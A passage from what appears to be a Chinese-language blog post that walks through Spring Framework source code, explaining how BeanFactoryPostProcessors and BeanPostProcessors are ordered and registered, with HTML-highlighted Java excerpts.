class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> ppName <span class="token operator">:</span> postProcessorNames<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token comment">// 判断是否实现了顺序接口，数字越小，优先级越高</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>beanFactory<span class="token punctuation">.</span><span class="token function">isTypeMatch</span><span class="token punctuation">(</span>ppName<span class="token punctuation">,</span> <span class="token class-name">PriorityOrdered</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 从容器中获取这个组件，并放到该集合，getBean 没有则会去创建</span>            currentRegistryProcessors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>ppName<span class="token punctuation">,</span> <span class="token class-name">BeanDefinitionRegistryPostProcessor</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            processedBeans<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>ppName<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token function">sortPostProcessors</span><span class="token punctuation">(</span>currentRegistryProcessors<span class="token punctuation">,</span> beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>      registryProcessors<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>currentRegistryProcessors<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 执行 当前接口的postProcessBeanDefinitionRegistry</span>      <span class="token function">invokeBeanDefinitionRegistryPostProcessors</span><span class="token punctuation">(</span>currentRegistryProcessors<span class="token punctuation">,</span> registry<span class="token punctuation">,</span> beanFactory<span class="token punctuation">.</span><span class="token function">getApplicationStartup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      currentRegistryProcessors<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Next, invoke the BeanDefinitionRegistryPostProcessors that implement Ordered.</span>      postProcessorNames <span class="token operator">=</span> beanFactory<span class="token punctuation">.</span><span class="token function">getBeanNamesForType</span><span class="token punctuation">(</span><span class="token class-name">BeanDefinitionRegistryPostProcessor</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> ppName <span class="token operator">:</span> postProcessorNames<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>processedBeans<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>ppName<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> beanFactory<span class="token punctuation">.</span><span class="token function">isTypeMatch</span><span class="token punctuation">(</span>ppName<span class="token punctuation">,</span> <span class="token class-name">Ordered</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            currentRegistryProcessors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>ppName<span class="token punctuation">,</span> <span class="token class-name">BeanDefinitionRegistryPostProcessor</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            processedBeans<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>ppName<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token function">sortPostProcessors</span><span class="token punctuation">(</span>currentRegistryProcessors<span class="token punctuation">,</span> beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>      registryProcessors<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>currentRegistryProcessors<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">invokeBeanDefinitionRegistryPostProcessors</span><span class="token punctuation">(</span>currentRegistryProcessors<span class="token punctuation">,</span> registry<span class="token punctuation">,</span> beanFactory<span class="token punctuation">.</span><span class="token function">getApplicationStartup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      currentRegistryProcessors<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Finally, invoke all other BeanDefinitionRegistryPostProcessors until no further ones appear.</span>      <span class="token keyword">boolean</span> reiterate <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span>reiterate<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         reiterate <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>         postProcessorNames <span class="token operator">=</span> beanFactory<span class="token punctuation">.</span><span class="token function">getBeanNamesForType</span><span class="token punctuation">(</span><span class="token class-name">BeanDefinitionRegistryPostProcessor</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> ppName <span class="token operator">:</span> postProcessorNames<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>processedBeans<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>ppName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               currentRegistryProcessors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>ppName<span class="token punctuation">,</span> <span class="token class-name">BeanDefinitionRegistryPostProcessor</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               processedBeans<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>ppName<span class="token punctuation">)</span><span class="token punctuation">;</span>               reiterate <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>         <span class="token punctuation">&#125;</span>         <span class="token function">sortPostProcessors</span><span class="token punctuation">(</span>currentRegistryProcessors<span class="token punctuation">,</span> beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>         registryProcessors<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>currentRegistryProcessors<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">invokeBeanDefinitionRegistryPostProcessors</span><span class="token punctuation">(</span>currentRegistryProcessors<span class="token punctuation">,</span> registry<span class="token punctuation">,</span> beanFactory<span class="token punctuation">.</span><span class="token function">getApplicationStartup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         currentRegistryProcessors<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token comment">// Now, invoke the postProcessBeanFactory callback of all processors handled so far.</span>      <span class="token function">invokeBeanFactoryPostProcessors</span><span class="token punctuation">(</span>registryProcessors<span class="token punctuation">,</span> beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">invokeBeanFactoryPostProcessors</span><span class="token punctuation">(</span>regularPostProcessors<span class="token punctuation">,</span> beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// Invoke factory processors registered with the context instance.</span>      <span class="token function">invokeBeanFactoryPostProcessors</span><span class="token punctuation">(</span>beanFactoryPostProcessors<span class="token punctuation">,</span> beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">// Do not initialize FactoryBeans here: We need to leave all regular beans</span>   <span class="token comment">// uninitialized to let the bean factory post-processors apply to them!</span>   <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> postProcessorNames <span class="token operator">=</span>         beanFactory<span class="token punctuation">.</span><span class="token function">getBeanNamesForType</span><span class="token punctuation">(</span><span class="token class-name">BeanFactoryPostProcessor</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Separate between BeanFactoryPostProcessors that implement PriorityOrdered,</span>   <span class="token comment">// Ordered, and the rest.</span>   <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">BeanFactoryPostProcessor</span><span class="token punctuation">></span></span> priorityOrderedPostProcessors <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> orderedPostProcessorNames <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> nonOrderedPostProcessorNames <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> ppName <span class="token operator">:</span> postProcessorNames<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>processedBeans<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>ppName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token comment">// skip - already processed in first phase above</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>beanFactory<span class="token punctuation">.</span><span class="token function">isTypeMatch</span><span class="token punctuation">(</span>ppName<span class="token punctuation">,</span> <span class="token class-name">PriorityOrdered</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         priorityOrderedPostProcessors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>ppName<span class="token punctuation">,</span> <span class="token class-name">BeanFactoryPostProcessor</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>beanFactory<span class="token punctuation">.</span><span class="token function">isTypeMatch</span><span class="token punctuation">(</span>ppName<span class="token punctuation">,</span> <span class="token class-name">Ordered</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         orderedPostProcessorNames<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>ppName<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>         nonOrderedPostProcessorNames<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>ppName<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">// First, invoke the BeanFactoryPostProcessors that implement PriorityOrdered.</span>   <span class="token function">sortPostProcessors</span><span class="token punctuation">(</span>priorityOrderedPostProcessors<span class="token punctuation">,</span> beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">invokeBeanFactoryPostProcessors</span><span class="token punctuation">(</span>priorityOrderedPostProcessors<span class="token punctuation">,</span> beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Next, invoke the BeanFactoryPostProcessors that implement Ordered.</span>   <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">BeanFactoryPostProcessor</span><span class="token punctuation">></span></span> orderedPostProcessors <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>orderedPostProcessorNames<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> postProcessorName <span class="token operator">:</span> orderedPostProcessorNames<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      orderedPostProcessors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>postProcessorName<span class="token punctuation">,</span> <span class="token class-name">BeanFactoryPostProcessor</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token function">sortPostProcessors</span><span class="token punctuation">(</span>orderedPostProcessors<span class="token punctuation">,</span> beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">invokeBeanFactoryPostProcessors</span><span class="token punctuation">(</span>orderedPostProcessors<span class="token punctuation">,</span> beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Finally, invoke all other BeanFactoryPostProcessors.</span>   <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">BeanFactoryPostProcessor</span><span class="token punctuation">></span></span> nonOrderedPostProcessors <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>nonOrderedPostProcessorNames<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> postProcessorName <span class="token operator">:</span> nonOrderedPostProcessorNames<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      nonOrderedPostProcessors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>postProcessorName<span class="token punctuation">,</span> <span class="token class-name">BeanFactoryPostProcessor</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token function">invokeBeanFactoryPostProcessors</span><span class="token punctuation">(</span>nonOrderedPostProcessors<span class="token punctuation">,</span> beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Clear cached merged bean definitions since the post-processors might have</span>   <span class="token comment">// modified the original metadata, e.g. replacing placeholders in values...</span>   beanFactory<span class="token punctuation">.</span><span class="token function">clearMetadataCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这里首先会判断 是否实现BeanDefinitionRegistry 接口。</p><p>里面分三种 </p><p>1、实现 PriorityOrdered 顺序优先级最高</p><p>2、Ordered顺序，低于PriorityOrdered </p><p>3、普通未实现顺序接口</p><p>按照这样的顺序去调用 invokeBeanFactoryPostProcessors ，就是接口的根方法</p><p>顺序都是数字越小，优先级越高</p><p>invokeBeanFactoryPostProcessors 中会循环调用相关接口的方法</p><h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><h4 id="ConfigurationClassPostProcessor"><a href="#ConfigurationClassPostProcessor" class="headerlink" title="ConfigurationClassPostProcessor"></a>ConfigurationClassPostProcessor</h4><p>就是通过实现BeanDefinitionRegistryPostProcessor，扫描配置类及其相关注解，如@Componment @componmentScan 来将这些信息封装为BeanDefinition以供后续创建bean的定义信息</p><h2 id="类型二：BeanPostProcessor类型为Bean的后置处理器增强"><a href="#类型二：BeanPostProcessor类型为Bean的后置处理器增强" class="headerlink" title="类型二：BeanPostProcessor类型为Bean的后置处理器增强"></a>类型二：BeanPostProcessor类型为Bean的后置处理器增强</h2><h3 id="BeanPostProcessor的注册"><a href="#BeanPostProcessor的注册" class="headerlink" title="BeanPostProcessor的注册"></a>BeanPostProcessor的注册</h3><p>refresh（）方法中的registerBeanPostProcessors（beanFactory） 入口</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">registerBeanPostProcessors</span><span class="token punctuation">(</span>      <span class="token class-name">ConfigurableListableBeanFactory</span> beanFactory<span class="token punctuation">,</span> <span class="token class-name">AbstractApplicationContext</span> applicationContext<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// WARNING: Although it may appear that the body of this method can be easily</span>   <span class="token comment">// refactored to avoid the use of multiple loops and multiple lists, the use</span>   <span class="token comment">// of multiple lists and multiple passes over the names of processors is</span>   <span class="token comment">// intentional. We must ensure that we honor the contracts for PriorityOrdered</span>   <span class="token comment">// and Ordered processors. Specifically, we must NOT cause processors to be</span>   <span class="token comment">// instantiated (via getBean() invocations) or registered in the ApplicationContext</span>   <span class="token comment">// in the wrong order.</span>   <span class="token comment">//</span>   <span class="token comment">// Before submitting a pull request (PR) to change this method, please review the</span>   <span class="token comment">// list of all declined PRs involving changes to PostProcessorRegistrationDelegate</span>   <span class="token comment">// to ensure that your proposal does not result in a breaking change:</span>   <span class="token comment">// https://github.com/spring-projects/spring-framework/issues?q=PostProcessorRegistrationDelegate+is%3Aclosed+label%3A%22status%3A+declined%22</span>   <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> postProcessorNames <span class="token operator">=</span> beanFactory<span class="token punctuation">.</span><span class="token function">getBeanNamesForType</span><span class="token punctuation">(</span><span class="token class-name">BeanPostProcessor</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Register BeanPostProcessorChecker that logs an info message when</span>   <span class="token comment">// a bean is created during BeanPostProcessor instantiation, i.e. when</span>   <span class="token comment">// a bean is not eligible for getting processed by all BeanPostProcessors.</span>   <span class="token keyword">int</span> beanProcessorTargetCount <span class="token operator">=</span> beanFactory<span class="token punctuation">.</span><span class="token function">getBeanPostProcessorCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> postProcessorNames<span class="token punctuation">.</span>length<span class="token punctuation">;</span>   beanFactory<span class="token punctuation">.</span><span class="token function">addBeanPostProcessor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BeanPostProcessorChecker</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">,</span> beanProcessorTargetCount<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Separate between BeanPostProcessors that implement PriorityOrdered,</span>   <span class="token comment">// Ordered, and the rest.</span>   <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">BeanPostProcessor</span><span class="token punctuation">></span></span> priorityOrderedPostProcessors <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">BeanPostProcessor</span><span class="token punctuation">></span></span> internalPostProcessors <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> orderedPostProcessorNames <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> nonOrderedPostProcessorNames <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> ppName <span class="token operator">:</span> postProcessorNames<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// 获取所有实现 PriorityOrdered</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>beanFactory<span class="token punctuation">.</span><span class="token function">isTypeMatch</span><span class="token punctuation">(</span>ppName<span class="token punctuation">,</span> <span class="token class-name">PriorityOrdered</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token class-name">BeanPostProcessor</span> pp <span class="token operator">=</span> beanFactory<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>ppName<span class="token punctuation">,</span> <span class="token class-name">BeanPostProcessor</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         priorityOrderedPostProcessors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pp<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">//  内部的</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>pp <span class="token keyword">instanceof</span> <span class="token class-name">MergedBeanDefinitionPostProcessor</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            internalPostProcessors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pp<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>beanFactory<span class="token punctuation">.</span><span class="token function">isTypeMatch</span><span class="token punctuation">(</span>ppName<span class="token punctuation">,</span> <span class="token class-name">Ordered</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         orderedPostProcessorNames<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>ppName<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>         nonOrderedPostProcessorNames<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>ppName<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">// First, register the BeanPostProcessors that implement PriorityOrdered.</span>   <span class="token comment">//首先，注册实现 PriorityOrdered 的 BeanPostProcessor。</span>   <span class="token function">sortPostProcessors</span><span class="token punctuation">(</span>priorityOrderedPostProcessors<span class="token punctuation">,</span> beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">registerBeanPostProcessors</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">,</span> priorityOrderedPostProcessors<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Next, register the BeanPostProcessors that implement Ordered.</span>   <span class="token comment">// 接下来，注册实现 Ordered 的 BeanPostProcessor。</span>   <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">BeanPostProcessor</span><span class="token punctuation">></span></span> orderedPostProcessors <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>orderedPostProcessorNames<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> ppName <span class="token operator">:</span> orderedPostProcessorNames<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">BeanPostProcessor</span> pp <span class="token operator">=</span> beanFactory<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>ppName<span class="token punctuation">,</span> <span class="token class-name">BeanPostProcessor</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      orderedPostProcessors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pp<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>pp <span class="token keyword">instanceof</span> <span class="token class-name">MergedBeanDefinitionPostProcessor</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         internalPostProcessors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pp<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token function">sortPostProcessors</span><span class="token punctuation">(</span>orderedPostProcessors<span class="token punctuation">,</span> beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">registerBeanPostProcessors</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">,</span> orderedPostProcessors<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Now, register all regular BeanPostProcessors.</span>   <span class="token comment">// 现在，注册所有常规的 BeanPostProcessor。 getBean</span>   <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">BeanPostProcessor</span><span class="token punctuation">></span></span> nonOrderedPostProcessors <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>nonOrderedPostProcessorNames<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> ppName <span class="token operator">:</span> nonOrderedPostProcessorNames<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">BeanPostProcessor</span> pp <span class="token operator">=</span> beanFactory<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>ppName<span class="token punctuation">,</span> <span class="token class-name">BeanPostProcessor</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token 